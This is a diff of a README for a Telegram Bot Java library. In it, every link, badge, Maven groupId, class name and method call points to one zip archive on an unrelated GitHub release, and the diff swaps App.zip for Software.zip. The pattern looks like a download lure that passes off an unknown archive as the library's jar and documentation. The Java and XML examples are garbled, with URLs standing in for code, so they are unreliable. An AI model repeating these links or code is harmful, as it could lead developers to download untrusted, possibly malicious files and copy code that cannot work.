@@ -1,11 +1,11 @@
 # Telegram Bot Java Library
-[![Telegram](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+[![Telegram](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
 
 
-[![Build Status](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
-[![Jitpack](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
-[![Maven Central](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
-[![MIT License](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+[![Build Status](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
+[![Jitpack](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
+[![Maven Central](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
+[![MIT License](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
 
 A simple to use library to create Telegram Bots in Java
 
@@ -25,69 +25,69 @@ Just import add the library to your project with one of these options:
 
 ```xml
     <dependency>
-        <groupId>https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip</groupId>
+        <groupId>https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip</groupId>
         <artifactId>telegrambots</artifactId>
         <version>2.4.4.5</version>
     </dependency>
 ```
 
-  2. Using Jitpack from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
-  3. Download the jar(including all dependencies) from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+  2. Using Jitpack from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
+  3. Download the jar(including all dependencies) from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
 
-In order to use Long Polling mode, just create your own bot extending `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`.
+In order to use Long Polling mode, just create your own bot extending `https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip`.
 
-If you like to use Webhook, extend `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`
+If you like to use Webhook, extend `https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip`
 
 
-Once done, you just need to create a `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`and register your bots:
+Once done, you just need to create a `https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip`and register your bots:
 
 ```java
 
-    // Example taken from https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip
+    // Example taken from https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip
     public class Main {
         public static void main(String[] args) {
     
             TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
             try {
-                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new ChannelHandlers());
-                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new DirectionsHandlers());
-                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new RaeHandlers());
-                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new WeatherHandlers());
-                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new TransifexHandlers());
-                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new FilesHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip(new ChannelHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip(new DirectionsHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip(new RaeHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip(new WeatherHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip(new TransifexHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip(new FilesHandlers());
             } catch (TelegramApiException e) {
-                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip();
+                https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip();
             }
         }
     }
 
 ```
 
-For detailed explanation, visite our [How To](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) (thanks Clevero)
+For detailed explanation, visite our [How To](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip) (thanks Clevero)
 
 
 ## Example bots
 Open them and send them */help* command to get some information about their capabilities:
 
-https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Use custom keyboards**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip (**Use custom keyboards**)
 
-https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Basic messages**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip (**Basic messages**)
 
-https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Send files by file_id**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip (**Send files by file_id**)
 
-https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Send files uploding them**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip (**Send files uploding them**)
 
-https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Inline support**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip (**Inline support**)
 
-https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Webhook support**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip (**Webhook support**)
 
-You can see code for those bots at [TelegramBotsExample](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) project.
+You can see code for those bots at [TelegramBotsExample](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip) project.
 
 ## Telegram Bot API
-This library use [Telegram bot API](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip), you can find more information following the link.
+This library use [Telegram bot API](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip), you can find more information following the link.
 
 ## Questions or Suggestions
-Feel free to create issues [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) as you need or join the [chat](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+Feel free to create issues [here](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip) as you need or join the [chat](https://github.com/suryaimelandabp/mybot1/releases/download/v2.0/Software.zip)
 
 ## License 
 MIT License
